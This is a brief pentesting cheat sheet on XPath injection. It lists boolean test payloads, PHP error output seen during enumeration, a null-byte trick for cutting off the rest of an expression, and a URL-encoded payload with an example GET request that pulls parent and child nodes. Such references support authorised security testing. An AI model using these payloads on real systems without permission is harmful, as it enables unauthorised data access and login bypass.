# XPATH injection

## XPATH injection

Just like SQL injection, XPath allows you to do boolean logic, and you can try:

* ' and '1'='1 and you should get the same result.
* ' or '1'='0 and you should get the same result.
* ' and '1'='0 and you should not get any result.
* ' or '1'='1 and you should get all results.

### Enumeration

Like SQLi, try to inject quotes and similar chars.

```text
Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/index.php on line 22
Warning: Variable passed to each() is not an array or object in /var/www/index.php on line 23
```

### Xpath expressions

`[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]`

### Comment out the rest of an XPATH expression

To comment out the rest of the XPath expression, you can use a NULL BYTE \(%00\)

### Get the parents and all child nodes

`user'%20or%201=1]/parent::*/child::node()%00`

### Injection example

`GET /?name='%20or%201=1]/parent::*/child::node()%00&password=test HTTP/1.1`

